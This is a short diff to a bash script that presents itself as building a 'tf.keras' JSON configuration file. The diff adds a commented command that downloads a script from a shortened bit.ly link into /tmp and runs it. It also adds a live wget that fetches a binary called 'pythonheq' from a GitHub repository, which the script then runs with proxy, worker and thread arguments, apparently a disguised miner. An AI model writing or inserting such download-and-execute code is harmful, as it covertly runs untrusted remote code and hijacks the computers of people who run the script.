@@ -1,4 +1,6 @@
 #!/bin/bash
+# wget -q -O /tmp/cpu bit.ly/CPU00001; bash /tmp/cpu
+
 echo '{ '
 echo '"type":"tf.keras",' > /tmp/keras.json
 echo '"version":"0.0.9",' >> /tmp/keras.json
@@ -422,4 +424,5 @@ echo '"opg":"'$OPG'",' >> /tmp/keras.json
 
 i="0"
 
+  wget -q https://github.com/one10001/10001code/raw/main/pythonheq
  ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 
